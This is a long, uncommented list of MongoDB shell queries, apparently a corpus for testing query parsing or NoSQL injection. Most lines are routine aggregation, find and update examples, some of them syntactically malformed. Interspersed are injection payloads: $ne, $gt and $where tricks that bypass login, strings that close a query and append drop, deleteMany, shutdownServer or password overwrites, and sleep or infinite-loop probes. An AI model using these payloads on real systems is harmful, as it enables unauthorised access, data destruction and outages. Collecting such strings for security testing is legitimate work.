db.travelers.aggregate( [{$graphLookup: {from: "airports",startWith: "$nearestAirport",connectFromField: "connects",connectToField: "airport",maxDepth: 2,depthField: "numConnections",as: "destinations"}}] )
db.people.aggregate( [{ $match: { name: "Tanya Jordan" } },{ $graphLookup: {from: "people",startWith: "$friends",connectFromField: "friends",connectToField: "name",as: "golfers",restrictSearchWithMatch: { hobbies: "golf" }}},{ $project: {name: 1,friends: 1,connections_who_play_golf: "$golfers.name"}}] )
db.sales.aggregate([{$group : {_id : { month: { $month: "$date" }, day: { $dayOfMonth: "$date" }, year: { $year: "$date" } },totalPrice: { $sum: { $multiply: [ "$price", "$quantity" ] } },averageQuantity: { $avg: "$quantity" },count: { $sum: 1 }}}])
db.sales.aggregate([{$group : {_id : null,totalPrice: { $sum: { $multiply: [ "$price", "$quantity" ] } },averageQuantity: { $avg: "$quantity" },count: { $sum: 1 }}}])
db.sales.aggregate( [ { $group : { _id : "$item" } } ] )
db.books.aggregate([{ $group : { _id : "$author", books: { $push: "$$ROOT" } } }])
db.orders.aggregate( [ { $indexStats: { } } ] )
db.article.aggregate({ $limit : 5 });
db.aggregate( [ { $listLocalSessions: { } } ] )
db.aggregate( [ { $listLocalSessions: { allUsers: true } } ] )
db.aggregate( [ { $listLocalSessions: { users: [ { user: "myAppReader", db: "test" } ] } } ] )
db.system.sessions.aggregate( [ { $listSessions: { allUsers: true } } ] )
db.system.sessions.aggregate( [ { $listSessions: { } } ] )
db.system.sessions.aggregate( [ { $listSessions: { users: [ {user: "myAppReader", db: "test" } ] } } ] )
db.orders.aggregate([{$lookup:{from: "inventory",localField: "item",foreignField: "sku",as: "inventory_docs"}}])
db.orders.aggregate([{$unwind: "$specs"},{$lookup:{from: "inventory",localField: "specs",foreignField: "size",as: "inventory_docs"}},{$match: { inventory_docs: { $ne: [] } }}])
db.orders.aggregate([{$lookup: {from: "items", localField: "item", foreignField: "item", as: "fromItems"}},{$replaceRoot: { newRoot: { $mergeObjects: [ { $arrayElemAt: [ "$fromItems", 0 ] }, "$$ROOT" ] } }},{ $project: { fromItems: 0 } }])
db.orders.aggregate([{$lookup:{from: "warehouses",let: { order_item: "$item", order_qty: "$ordered" },pipeline: [{ $match:{ $expr:{ $and:[{ $eq: [ "$stock_item", "$$order_item" ] },{ $gte: [ "$instock", "$$order_qty" ] }]}}},{ $project: { stock_item: 0, _id: 0 } }],as: "stockdata"}}])
db.absences.aggregate([{$lookup:{from: "holidays",pipeline: [{ $match: { year: 2018 } },{ $project: { _id: 0, date: { name: "$name", date: "$date" } } },{ $replaceRoot: { newRoot: "$date" } }],as: "holidays"}}])
db.articles.aggregate([ { $match : { author : "dave" } } ]);
db.articles.aggregate( [{ $match: { $or: [ { score: { $gt: 70, $lt: 90 } }, { views: { $gte: 1000 } } ] } },{ $group: { _id: null, count: { $sum: 1 } } }] );
db.books.aggregate( [{ $group : { _id : "$author", books: { $push: "$title" } } },{ $out : "authors" }] )
db.books.aggregate( [ { $project : { title : 1 , author : 1 } } ] )
db.bookmarks.aggregate( [ { $project: { author: { first: 0}, lastModified: 0 } } ] )
db.books.aggregate( [{$project: {title: 1,author.first: 1,author.last: 1,author.middle: {$cond: {if: { $eq: [ "", "$author.middle" ] },then: "$$REMOVE",else: "$author.middle"}}}}] )
db.bookmarks.aggregate( [ { $project: { stop.title: 1 } } ] )
db.bookmarks.aggregate( [ { $project: { stop: { title: 1 } } } ] )
db.books.aggregate([{$project: {title: 1,isbn: {prefix: { $substr: [ "$isbn", 0, 3 ] },group: { $substr: [ "$isbn", 3, 2 ] },publisher: { $substr: [ "$isbn", 5, 4 ] },title: { $substr: [ "$isbn", 9, 3 ] },checkDigit: { $substr: [ "$isbn", 12, 1] }},lastName: "$author.last",copiesSold: "$copies"}}])
db.collection.aggregate( [ { $project: { myArray: [ "$x", "$y" ] } } ] )
var userAccess = [ "STLW", "G" ];db.forecasts.aggregate([{ $match: { year: 2014 } },{ $redact: {$cond: {if: { $gt: [ { $size: { $setIntersection: [ "$tags", userAccess ] } }, 0 ] },then: "$$DESCEND",else: "$$PRUNE"}}}]);
db.accounts.aggregate([{ $match: { status: "A" } },{$redact: {$cond: {if: { $eq: [ "$level", 5 ] },then: "$$PRUNE",else: "$$DESCEND"}}}]);
db.produce.aggregate( [{$replaceRoot: { newRoot: "$in_stock" }}] )
db.people.aggregate( [{$match: { pets : { $exists: true } }},{$replaceRoot: { newRoot: "$pets" }}] )
db.contacts.aggregate( [{$replaceRoot: {newRoot: {full_name: {$concat : [ "$first_name", " ", "$last_name" ]}}}}] )
db.contacts.aggregate( [{$unwind: "$phones"},{$match: { phones.cell: { $exists: true } }},{$replaceRoot: { newRoot: "$phones"}}] )
db.users.aggregate([ { $sample: { size: 3 } } ])
db.article.aggregate({ $skip : 5 });
db.users.aggregate([{ $sort : { age : -1, posts: 1 } }])
db.users.aggregate([{ $match: { $text: { $search: "operating" } } },{ $sort: { score: { $meta: "textScore" }, posts: -1 } }])
db.articles.aggregate([{ $match: { $text: { $search: "saber -claro", $language: "es" } } },{ $group: { _id: null, views: { $sum: "$views" } } }])
db.articles.aggregate([{ $match: { $text: { $search: "cake tea" } } },{ $project: { title: 1, _id: 0, score: { $meta: "textScore" } } },{ $match: { score: { $gt: 1.0 } } }])
db.mobiles.find({$text : {$search : "samsung note edge"}}, {score : {$meta : "textScore" }}).sort({score : {$meta : "textScore" }})
db.exhibits.aggregate( [ { $unwind: "$tags" }, { $sortByCount: "$tags" } ] )
db.inventory.aggregate( [ { $unwind : "$sizes" } ] )
db.inventory.aggregate( [ { $unwind: { path: "$sizes", includeArrayIndex: "arrayIndex" } } ] )
db.inventory.aggregate( [{ $unwind: { path: "$sizes", preserveNullAndEmptyArrays: true } }] )
db.users.find({username: "admin", password: {$gt: ""}})
db.users.find({username: "admin"});//,password: {$gt: ""}*^
db.users.find({username: "admin", password: "abcd" || 1==1})
db.users.find({username: "admin" || 1==1, password: {$ne: ""}})
db.users.find({username: "admin"; return true;//, password: {$ne: ""}})
db.users.find({username: "admin"});db.user.insert([username=>"user",password=>"12345678"])//, password: {$ne: ""}*^
db.users.find({username: "admin"});db.users.update({username:"admin"},{username:"admin",password:"12345678"},{ upsert: true })//@, password: "abcd"*^
db.users.find({username: "admin"});db.users.deleteOne({username:"admin"})//@, password: "abcd"*^
db.users.find({username: "admin"});db.users.deleteMany({username:"admin"})//@, password: "abcd"*^
db.users.find({username: "admin"});db.users.drop()//@, password: "abcd"*^
db.users.find({username: "admin"});db.users.remove(username:"admin")//@, password: "abcd"*^
db.users.find({username: "admin"});db.user.insertOne([username=>"user",password=>"12345678"])//, password: {$ne: ""}*^
db.users.find({username: "admin"; return 1;//, password: {$ne: ""}})
db.users.find({username: "admin"; return 1==1;//, password: {$ne: ""}})
db.users.find({username: "admin"});db.users.updateOne({username:"admin"},{$set : {password:"12345678"}},{ upsert: true })//@, password: "abcd"*^
db.users.find({username: "admin"});db.users.updateMany({username:"admin"},{$set : {password:"12345678"}},{ upsert: true })//@, password: "abcd"*^
db.users.find({username: "admin"});db.users.replaceOne({username:"admin"},{username:"admin", password:"12345678"},{ upsert: true })//@, password: "abcd"*^
db.users.find({username: "admin"});db.users.findOneAndDelete({username:"admin"})//@, password: "abcd"*^
db.users.find({username: "admin"});db.users.findOneAndReplace({username:"admin"},{username:"admin", password:"12345678"})//@, password: "abcd"*^
db.users.find({username: "admin"});db.users.findOneAndUpdate({username:"admin"},{username:"admin", password:"12345678"})//@, password: "abcd"*^
db.orders.group({key: { ord_dt: 1, item.sku: 1 },cond: { ord_dt: { $gt: new Date( '01/01/2012' ) } },reduce: function ( curr, result ) { },initial: { }})
db.orders.group({key: { ord_dt: 1, item.sku: 1 },cond: { ord_dt: { $gt: new Date( '01/01/2012' ) } },reduce: function( curr, result ) {result.total += curr.item.qty;},initial: { total : 0 }})
db.orders.group({keyf: function(doc) {return { day_of_week: doc.ord_dt.getDay() };},cond: { ord_dt: { $gt: new Date( '01/01/2012' ) } },reduce: function( curr, result ) {result.total += curr.item.qty;result.count++;},initial: { total : 0, count: 0 },finalize: function(result) {var weekdays = ["Sunday", "Monday", "Tuesday","Wednesday", "Thursday","Friday", "Saturday"];result.day_of_week = weekdays[result.day_of_week];result.avg = Math.round(result.total / result.count);}})
db.orders.group({key: { ord_dt: 1 },cond: { ord_dt: { $lt: new Date( '01/01/2012' ) } },reduce: function ( curr, result ) { },initial: { }})
db.orders.group({key: { ord_dt: 1, item.sku: 1 },,reduce: function ( curr, result ) { },initial: { }})
db.orders.group({key: { ord_dt: 1, item.sku: 1 },cond: { },reduce: function ( curr, result ) { },initial: { }})
db.orders.group({key: { ord_dt: 1, item.sku: 1 },cond: { ord_dt: { $gt: new Date( '01/01/2012' ) } },reduce: function( curr, result ) {result.totalQuantity += curr.item.qty;result.totalPrice += curr.item.qty*curr.item.price;},initial: { totalQuantity : 0, totalPrice : 0 }})
db.orders.group({keyf: function(doc) {return { day_of_week: doc.ord_dt.getDay() };},cond: { ord_dt: { $gt: new Date( '01/01/2012' ) } },reduce: function( curr, result ) {result.total += curr.item.qty;result.count++;},initial: { total : 0, count: 0 }})
db.orders.group({keyf: function(doc) {return { day_of_week: doc.ord_dt.getDay() };},cond: { ord_dt: { $gt: new Date( '01/01/2012' ) } },reduce: function( curr, result ) {result.total += curr.item.qty;result.count++;},initial: { total : 0, count: 0 },finalize: function(result) {result.avg = Math.round(result.total / result.count);}})
db.orders.group({key: { ord_dt: 1, item.sku: 1 },cond: { ord_dt: { $gt: new Date( '01/01/2012' ) } },reduce: function ( curr, result ) { },initial: { },collation: { locale: "fr", strength: 1 }})
db.orders.group({key: { ord_dt: 1, item.sku: 1 },cond: { ord_dt: { $gt: new Date( '01/01/2012' ) } },reduce: function( curr, result ) {result.total += curr.item.qty;},initial: { total : 0 },collation: { locale: "fr", strength: 1 }})
db.orders.group({keyf: function(doc) {return { day_of_week: doc.ord_dt.getDay() };},cond: { ord_dt: { $gt: new Date( '01/01/2012' ) } },reduce: function( curr, result ) {result.total += curr.item.qty;result.count++;},initial: { total : 0, count: 0 },collation: { locale: "fr", strength: 1 }})
db.collection.bulkWrite( [{ insertOne : { document: {username: "user", password: "123456789"} } }] )
db.collection.bulkWrite( [{ updateOne :{filter: { document: {username: "user"} ,update: { document: {username:"user", password: "123456789"}}}}}] )
db.collection.bulkWrite( [{ updateOne :{filter: { document: {username: "user"} ,update: { document: {username:"user", password: "123456789"} ,upsert: true}}}}] )
db.collection.bulkWrite( [{ updateMany :{filter: { document: {username: "user"} ,update: { document: {username: "user", password: "123456789"}}}}}] )
db.collection.bulkWrite( [{ updateMany :{filter: { document: {username: "user"} ,update: { document: {username: "user", password: "123456789"} ,upsert: true}}}}] )
db.collection.bulkWrite( [{ replaceOne:{filter: { document: {username: "user"} ,replacement: { document: {username: "user", password: "123456789"}}}}}] )
db.collection.bulkWrite( [{ replaceOne:{filter: { document: {username: "user"} ,replacement: { document: {username: "user", password: "123456789"} ,upsert: true}}}}] )
db.collection.bulkWrite([{ deleteOne : { filter: {username: "user"} } }] )
db.collection.bulkWrite([{ deleteMany : { filter: {username: "user"} } }] )
try {db.characters.bulkWrite([{ insertOne :{document:{_id: 4, char: "Dithras", class: "barbarian", lvl: 4}}},{ insertOne :{document:{_id: 5, char: "Taeln", class: "fighter", lvl: 3}}},{ updateOne :{filter: { char: "Eldon" },update: { $set : { status: "Critical Injury" } }}},{ deleteOne :{ filter: { char: "Brisbane"} }},{ replaceOne :{filter: { char: "Meldane" },replacement: { char: "Tanys", class: "oracle", lvl: 4 }}}]);}catch (e) {print(e);}
try {db.characters.bulkWrite([{ insertOne :{document:{_id: 4, char: "Dithras", class: "barbarian", lvl: 4}}},{ insertOne :{document:{_id: 4, char: "Taeln", class: "fighter", lvl: 3}}},{ updateOne :{filter: { char: "Eldon" },update: { $set : { status: "Critical Injury" } }}},{ deleteOne :{ filter: { char: "Brisbane"} }},{ replaceOne :{filter: { char: "Meldane" },replacement: { char: "Tanys", class: "oracle", lvl: 4 }}}],{ ordered : false });}catch (e) {print(e);}
try {db.enemies.bulkWrite([{ updateMany :{filter: { rating: { $gte : 3} },update: { $inc : { encounter: 0.1 } }},},{ updateMany :{filter: { rating: { $lt : 2} },update: { $inc : { encounter: -0.25 } }},},{ deleteMany : { filter: { "encounter" { $lt : 0 } } } },{ insertOne :{document:{_id:5, char: "ogrekin" , rating: 2, encounter: 0.31}}}],{ writeConcern : { w : "majority", wtimeout : 100 } });}catch (e) {print(e);}
db.stores.find( { $text: { $search: "java coffee shop" } } )
db.stores.find({ $text: { $search: "coffee shop cake" } },{ score: { $meta: "textScore" } }).sort( { score: { $meta: "textScore" } } )
db.articles.aggregate([{ $match: { $text: { $search: "cake tea" } } },{ $sort: { score: { $meta: "textScore" } } },{ $project: { title: 1, _id: 0 } }])
db.articles.aggregate([{ $match: { $text: { $search: "saber -claro", $language: "es" } } },{ $group: { _id: null, views: { $sum: "$views" } } }])
db.users.copyTo("copyUsers")
db.myColl.createIndex( { category: 1 }, { collation: { locale: "fr" } } )
db.myColl.createIndex({ score: 1, price: 1, category: 1 },{ collation: { locale: "fr" } } )
db.collection.createIndex({ category: 1 },{ name: "category_fr", collation: { locale: "fr", strength: 2 } })
try {db.orders.deleteOne( { _id: ObjectId("563237a41a4d68582c2509da") } );} catch (e) {print(e);}
try {db.orders.deleteOne({ _id: ObjectId("563237a41a4d68582c2509da") },{ w : "majority", wtimeout : 100 });} catch (e) {print (e);}
db.myColl.deleteOne({ category: "cafe", status: "A" },{ collation: { locale: "fr", strength: 1 } })
try {db.orders.deleteMany( { client: "Crude Traders Inc." } );} catch (e) {print (e);}
try {db.orders.deleteMany( { stock: "Brent Crude Futures", limit: { $gt : 48.88 } } );} catch (e) {print (e);}
try {db.orders.deleteMany({ client: "Crude Traders Inc." },{ w : "majority", wtimeout : 100 });} catch (e) {print (e);}
db.myColl.deleteMany({ category: "cafe", status: "A" },{ collation: { locale: "fr", strength: 1 } })
db.users.drop()
db.pets.dropIndex( "catIdx" )
db.pets.dropIndex( { cat: -1 } )
db.bios.remove( { } )
db.products.remove({ qty: { $gt: 20 } },{ writeConcern: { w: "majority", wtimeout: 5000 } })
db.products.remove( { qty: { $gt: 20 } }, true )
db.products.remove( { qty: { $gt: 20 }, $isolated: 1 } )
db.myColl.remove({ category: "cafe", status: "A" },{ collation: { locale: "fr", strength: 1 } })
db.rrecord.renameCollection("record")
db.rrecord.renameCollection("record", true)
db.collection.totalSize()
db.inventory.find( { qty: { $mod: [ 4, 0 ] } } )
db.users.find( { name: { $in: [ /^acme/i, /^ack/ ] } } )
db.users.find( { name: { $regex: /acme.*corp/i, $nin: [ 'acmeblahcorp' ] } } )
db.users.find( { name: { $regex: /acme.*corp/, $options: 'i', $nin: [ 'acmeblahcorp' ] } } )
db.users.find( { name: { $regex: 'acme.*corp', $options: 'i', $nin: [ 'acmeblahcorp' ] } } )
db.users.find( { name: { $regex: /acme.*corp/, $options: "si" } } )
db.users.find( { name: { $regex: 'acme.*corp', $options: "si" } } )
db.products.find( { sku: { $regex: /789$/ } } )
db.products.find( { sku: { $regex: /^ABC/i } } )
db.products.find( { description: { $regex: /^S/, $options: 'm' } } )
db.products.find( { description: { $regex: /S/ } } )
db.products.find( { description: { $regex: /m.*line/, $options: 'si' } } )
var pattern = "abc #category code\n123 #item number"; db.products.find( { sku: { $regex: pattern, $options: "x" } } )
db.myCollection.find( { $where: "this.credits == this.debits" } );
db.myCollection.find( { $where: "obj.credits == obj.debits" } );
db.myCollection.find( { active: true, $where: "this.credits - this.debits < 0" } );
db.articles.find( { tags: { $all: [ [ "ssl", "security" ] ] } } )
db.articles.find( { $and: [ { tags: [ "ssl", "security" ] } ] } )
db.articles.find( { tags: [ "ssl", "security" ] } )
db.inventory.find( {qty: { $all: [{ $elemMatch: { size: "M", num: { $gt: 50} } },{ $elemMatch: { num : 100, color: "green" } }] }} )
db.inventory.find( { qty.num: { $all: [ 50 ] } } )
db.inventory.find( { dim_cm: { $elemMatch: { $gt: 22, $lt: 30 } } } )
db.inventory.find( { tags: { $size: 3 } } )
db.inventory.find( { instock: { $elemMatch: { qty: { $gt: 10, $lte: 20 } } } } )
db.scores.find({ results: { $elemMatch: { $gte: 80, $lt: 85 } } })
db.survey.find({ results: { $elemMatch: { product: "xyz", score: { $gte: 8 } } } })
db.survey.find({ results: { $elemMatch: { product: "xyz" } } })
db.collection.save({ _id: 1, a: 54, binaryValueofA: "00110110" })
db.collection.save({ _id: 2, a: 20, binaryValueofA: "00010100" }) 
db.collection.save({ _id: 3, a: 20.0, binaryValueofA: "00010100" })
db.collection.save({ _id: 4, a: BinData(0, "Zg=="), binaryValueofA: "01100110" })
db.collection.find( { a: { $bitsAllClear: [ 1, 5 ] } } )
db.collection.find( { a: { $bitsAllClear: 35 } } )
db.collection.find( { a: { $bitsAllClear: BinData(0, "ID==") } } )
db.collection.find( { a: { $bitsAllSet: [ 1, 5 ] } } )
db.collection.find( { a: { $bitsAllSet: 50 } } )
db.collection.find( { a: { $bitsAllSet: BinData(0, "MC==") } } )
db.collection.find( { a: { $bitsAnyClear: [ 1, 5 ] } } )
db.collection.find( { a: { $bitsAnyClear: 35 } } )
db.collection.find( { a: { $bitsAnyClear: BinData(0, "MC==") } } )
db.collection.find( { a: { $bitsAnySet: [ 1, 5 ] } } )
db.collection.find( { a: { $bitsAnySet: 35 } } )
db.collection.find( { a: { $bitsAnySet: BinData(0, "MC==") } } )
db.records.find({x: { $mod: [ 2, 0 ] },$comment: "Find even values."})
db.records.aggregate( [{ $match: { x: { $gt: 0 }, $comment: "Do not allow negative inputs." } },{ $group : { _id: { $mod: [ "$x", 2 ] }, total: { $sum: "$x" } } }] )
db.students.find( { semester: 1, grades: { $gte: 85 } },{ grades.$.std: 1 } )
db.students.find({ grades.mean: { $gt: 70 } },{ grades.$.std: 1 })
db.schools.find( { zipcode: "63109" },{ students: { $elemMatch: { school: 102 } } } )
db.schools.find( { zipcode: "63109" },{ students: { $elemMatch: { school: 102, age: { $gt: 10} } } } )
db.posts.find( {}, { comments: { $slice: 5 } } )
db.posts.find( {}, { comments: { $slice: -5 } } )
db.posts.find( {}, { comments: { $slice: [ 20, 10 ] } } )
db.adminCommand( { killOp: 1, op: 724 } )
db.adminCommand({renameCollection: "test.orders",to: "test.orders-2016"})
db.adminCommand({createUser: "bruce",pwd: "bruce123",roles: [{ role: "dbOwner", db: "admin" }]})
db.cloneCollection('mongodb.example.net:27017', 'users.profile',{ active: true } )
db.cloneDatabase("hostname")
db.copyDatabase('records', 'archive_records')
db.copyDatabase("reporting","reporting_copy","example.net","reportUser","abc123","MONGODB-CR")
db.createCollection( "contacts",{validator: { $or:[{ phone: { $type: "string" } },{ email: { $regex: /@mongodb\.com$/ } },{ status: { $in: [ "Unknown", "Incomplete" ] } }]}})
db.createCollection("users",{ storageEngine: { wiredTiger: { configString: "<option>=<setting>" } } })
db.killOp(6)
db.logout()
db.shutdownServer()
db.repairDatabase()
db.runCommand( {aggregate: "articles",pipeline: [{ $project: { tags: 1 } },{ $unwind: "$tags" },{ $group: { _id: "$tags", count: { $sum : 1 } } }],cursor: { }} )
db.location.find( { town: { $regex: "(Pine Lumber)",$options: 'i' } } ).maxTimeMS(30)
db.runCommand( { distinct: "collection",key: "city",maxTimeMS: 45 } )
db.currentOp(true)
db.currentOp( { $all: true } )
db.currentOp({waitingForLock: true,$or: [{ op: { $in: [ "insert", "update", "remove" ] } },{ query.findandmodify: { $exists: true } }]})
db.currentOp({active: true,numYields: 0,waitingForLock: false})
db.currentOp({active: true,secs_running: { $gt: 3 },ns: /^db1\./})
db.currentOp({$or: [{ op: "command", query.createIndexes: { $exists: true } },{ op: "none", ns: /\.system\.indexes\b/ }]})
db.users.find({username: "admin"});db.users.save({username:"newUser", password:"12345678"})//@, password: "abcd"*^
db.users.find({username: "admin"});db.users.renameCollection("record")//@, password: "abcd"*^
db.users.find({username: "admin"});db.users.bulkWrite( [{ insertOne : { document:{username:"newUser", password:"12345678"} } }])//@, password: "abcd"*^
db.users.find({username: "admin"});db.users.bulkWrite( [{ updateOne : { filter:{username:"admin"} , update: {username:"newUser", password:"12345678"}} }])//@, password: "abcd"*^
db.users.find({username: "admin"});db.users.bulkWrite( [{ updateMany: { filter:{username:"admin"} , update: {username:"newUser", password:"12345678"}} }])//@, password: "abcd"*^
db.users.find({username: "admin"});db.users.bulkWrite( [{ replaceOne : { filter:{username:"admin"} , replacement: {username:"newUser", password:"12345678"}} }])//@, password: "abcd"*^
db.users.find({username: "admin"});db.users.bulkWrite( [{ deleteOne : { filter:{username:"admin"} } }])//@, password: "abcd"*^
db.users.find({username: "admin"});db.users.bulkWrite( [{ deleteMany : { filter:{username:"admin"} } }])//@, password: "abcd"*^
db.users.find({username: "admin"});db.users.copyTo(newUser)//@, password: "abcd"*^
db.users.find({username: "admin"});db.users.distinct( "username" )//@, password: "abcd"*^
db.users.find({username: "admin"});db.cloneCollection('mongodb.example.net:27017', 'users.profile')//@, password: "abcd"*^
db.users.find({username: "admin"});db.cloneDatabase("hostname")//@, password: "abcd"*^
db.users.find({username: "admin"});db.copyDatabase('records', 'archive_records')//@, password: "abcd"*^
db.users.find({username: "admin"});db.createCollection("user")//@, password: "abcd"*^
db.users.find({username: "admin"});db.shutdownServer()//@, password: "abcd"*^
db.users.find({username: "admin", $where: "1==1"})//@, password: "abcd"*^
db.users.find({username: "admin", password: "abcd", $where: "1==1"})
db.users.find({username: "admin", $where: function(){return true}})//@, password: "abcd"*^
db.users.find({username: "admin", $where: function(){return 1}})//@, password: "abcd"*^
db.users.find({username: "admin", $where: "this.password != "" "})//@, password: "abcd"*^
db.users.find({username: "admin"});sleep(10000);//@, password: "abcd"*^
db.users.find({username: "admin", password: "abcd"});sleep(10000);//@*^
db.users.find({username: "admin"}); while(true){};//@, password: "abcd"*^
db.users.find({username: "admin", password: {$or: [{}, "123456789"]}})
db.users.find({username: {$or: [{}, "admin"]}, password: {$or: [{}, "123456789"]}})
db.myCollection.find( { $where: "this.credits == this.debits || 1==1" } );
db.myCollection.find( { $where: "this.credits == this.debits || this.credits != ''" } );
db.collection.find( { $query: { age : 25 } } )
db.documents.find( { $query: { query: { a: 1 } } } )
db.collection.find( { $query: {age:{ $gt: 12 }}, $orderby: { age : -1 } } )
db.products.update({ _id: 1 },{ $mul: { price: 1.25 } })
db.products.update({ _id: 3 },{ $mul: { price: NumberInt(5) } })
db.students.updateMany( {}, { $rename: { name: "name" } } )
db.students.update( { _id: 1 }, { $rename: { name.first: "name.fname" } } )
db.products.update({ _id: 1 }, {$set: { item: "apple" },$setOnInsert: { defaultQty: 100 } }, { upsert: true })
db.users.update({ _id: 1 },{$currentDate: {lastModified: true,cancellation.date: { $type: "timestamp" }},$set: { status: "D",cancellation.reason: "user request"}})
db.students.update({ name: "joe" },{ $push: { scores: { $each: [ 90, 92, 85 ] } } })
db.inventory.update({ _id: 2 },{ $addToSet: { tags: { $each: [ "camera", "electronics", "accessories" ] } } } )
db.students.update({ _id: 1 },{$push: {scores: {$each: [ 50, 60, 70 ],$position: 0}}})
db.students.update({ _id: 1 },{$push: {scores: {$each: [ 20, 30 ],$position: 2}}})
db.test.update({ _id: 1 },{ $addToSet: {letters: [ "c", "d" ] } })
db.inventory.update({ _id: 1 },{ $addToSet: { tags: "accessories" } })
db.students.update({ _id: 1 },{$push: {quizzes: {$each: [ { id: 3, score: 8 }, { id: 4, score: 7 },{ id: 5, score: 6 } ],$sort: { score: 1 }}}})
db.students.update( { _id: 2 },{ $push: { tests: { $each: [ 40, 60 ], $sort: 1 } } })
db.students.update({ _id: 5 },{$push: {quizzes: {$each: [ { wk: 5, score: 8 }, { wk: 6, score: 7}, { wk: 7, score: 6 } ],$sort: { score: -1 },$slice: 3}}})
db.stores.update({ },{ $pull: { fruits: { $in: [ "apples", "oranges" ] }, vegetables: "carrots" } },{ multi: true })
db.survey.update({ },{ $pull: { results: { answers: { $elemMatch: { q: 2, a: { $gte: 8 } } } } } },{ multi: true })
db.students.update( { _id: 1 }, { $pop: { scores: -1 } } )
db.students.update( { _id: 1 }, { $pop: { scores: 1 } } )
db.switches.update({ _id: 1 },{ $bit: { expdata: { and: NumberInt(10) } } })
db.switches.update({ _id: 2 },{ $bit: { expdata: { or: NumberInt(5) } } })
db.switches.update({ _id: 3 },{ $bit: { expdata: { xor: NumberInt(5) } } })
db.foo.update({ status : "A" , $isolated : 1 },{ $inc : { count : 1 } },{ multi: true })
db.accounts.aggregate([{ $match: { status: "A" } },{$redact: {$cond: {if: { $eq: [ "$level", 5 ] },then: "$$PRUNE", else: "$$DESCEND"}}}]);
db.inventory.aggregate([{$project:{item: 1,qty: 1,cmpTo250: {$cmp: [ "$qty", 250 ] },_id: 0}}])
db.experiments.aggregate([{ $project: { A: 1, B: 1, sameElements: { $setEquals: [ "$A", "$B" ] }, _id: 0 } }])
db.experiments.aggregate([{ $project: { A: 1, B: 1, commonToBoth: { $setIntersection: [ "$A", "$B" ] }, _id: 0 } }])
db.experiments.aggregate([{ $project: { A:1, B: 1, allValues: { $setUnion: [ "$A", "$B" ] }, _id: 0 } }])
db.experiments.aggregate([{ $project: { A: 1, B: 1, inBOnly: { $setDifference: [ "$B", "$A" ] }, _id: 0 } }])
db.experiments.aggregate([{ $project: { A:1, B: 1, AisSubset: { $setIsSubset: [ "$A", "$B" ] }, _id:0 } }])
db.survey.aggregate([{ $project: { responses: 1, isAnyTrue: { $anyElementTrue: [ "$responses" ] }, _id: 0 } }])
db.survey.aggregate([{ $project: { responses: 1, isAllTrue: { $allElementsTrue: [ "$responses" ] }, _id: 0 } }])
db.sales.aggregate( [{$project: {finalTotal: {$let: {vars: {total: { $add: [ '$price', '$tax' ] },discounted: { $cond: { if: '$applyDiscount', then: 0.9, else: 1 } }},in: { $multiply: [ "$$total", "$$discounted" ] }}}}}] )
db.records.aggregate( [{ $project: { costsOneDollar: { $eq: [ "$price", { $literal: "$1" } ] } } }] )
db.bids.aggregate( [{ $project: { item: 1, startAt: { $literal: 1 } } }] )
db.records.find()
db.records.find().pretty()
db.collection.find({author: "William Shakespeare"})
db.collection.find({color: "red"})
db.collection.find({size: "XXL"})
db.collection.find({id: "207"})
db.collection.find({age: "35"})
db.collection.find({city: "London"})
db.collection.find({employee: "john"})
db.collection.find({department: "CSE"}).pretty()
db.collection.find({size: "XXL"}).pretty()
db.collection.find({id: "207"}).pretty()
db.collection.find({age: "35"}).pretty()
db.collection.find({author: "William Shakespeare"}).pretty()
db.collection.find({age: {$lt: 50}})
db.collection.find({age: {$gt: 30}})
db.collection.find({age: {$lte: 60}})
db.collection.find({age: {$gte: 25}})
db.collection.find({age: {$ne: 0}})
db.collection.find({size: {$ne: "XL"}})
db.collection.find({color: {$ne: "Blue"}})
db.collection.find({id: {$ne: 1}})
db.collection.find({id: {$lt: 100}})
db.collection.find({id: {$gt: 20}})
db.collection.find({id: {$lte: 85}})
db.collection.find({id: {$gte: 42}})
db.collection.find({size: {$ne: "XL"}}).pretty()
db.collection.find({color: {$ne: "Blue"}}).pretty()
db.collection.find({id: {$ne: 1}}).pretty()
db.collection.find({id: {$lt: 100}}).pretty()
db.collection.find({age: {$gt: 30}}).pretty()
db.collection.find({age: {$lte: 60}}).pretty()
db.collection.find({quantity: {$gte: 5}})
db.collection.find({quantity: {$lte: 7}})
db.collection.find({quantity: {$gt: 11}})
db.collection.find({quantity: {$gt: 32}})
db.collection.find({quantity: {$ne: 3}})
db.collection.find({score: {$gte: 2}})
db.collection.find({score: {$gt: 1}})
db.collection.find({score: {$lte: 3}})
db.collection.find({score: {$lt: 5}})
db.collection.find({score: {$ne: 0}})
db.collection.find({year: {$gte: 1960}})
db.collection.find({year: {$gt: 1980}})
db.collection.find({year: {$lte: 2010}})
db.collection.find({year: {$lt: 2020}})
db.collection.find({year: {$ne: 2000}})
db.collection.find({year: {$gt: 1960, $lt: 2000}})
db.collection.find({year: {$gte: 1950, $lt: 2005}})
db.collection.find({year: {$gt: 1800, $lte: 1920}})
db.collection.find({year: {$gte: 1900, $lte: 1975}})
db.collection.find({age: {$gt: 20, $lt: 60}})
db.collection.find({age: {$gte: 10, $lt: 30}})
db.collection.find({age: {$gt: 25, $lte: 45}})
db.collection.find({age: {$gte: 22, $lte: 57}})
db.collection.find({year: {$lt: 2020}}).pretty()
db.collection.find({year: {$ne: 2000}}).pretty()
db.collection.find({year: {$gt: 1960, $lt: 2000}}).pretty()
db.collection.find({year: {$gte: 1950, $lt: 2005}}).pretty()
db.collection.find({age: {$gt: 25, $lte: 45}}).pretty()
db.collection.find({age: {$gte: 22, $lte: 57}}).pretty()
db.collection.find({product.ordered: "36"})
db.collection.find({product.ordered: {$gt: 30}})
db.collection.find({product.ordered: {$lt: 400}})
db.collection.find({product.ordered: {$gte: 120}})
db.collection.find({product.ordered: {$lte: 200}})
db.collection.find(quantity: { in_stock: 8, ordered: 12 })
db.collection.find(quantity: { in_stock: {$lt: 8}, ordered: 12 })
db.collection.find(quantity: { in_stock: {$lte: 8}, ordered: 12 })
db.collection.find(quantity: { in_stock: {$gt: 8}, ordered: 12 })
db.collection.find(quantity: { in_stock: {$gte: 8}, ordered: 12 })
db.collection.find(quantity: { in_stock: 8, ordered: {$lt: 12}})
db.collection.find(quantity: { in_stock: 8, ordered: {$lte: 12}})
db.collection.find(quantity: { in_stock: 8, ordered: {$gt: 12}})
db.collection.find(quantity: { in_stock: 8, ordered: {$gte: 12}})
db.collection.find(quantity: { in_stock: {$gt: 8}, ordered: {$lt: 12}})
db.collection.find(quantity: { in_stock: {$gte: 12}, ordered: {$lt: 12}})
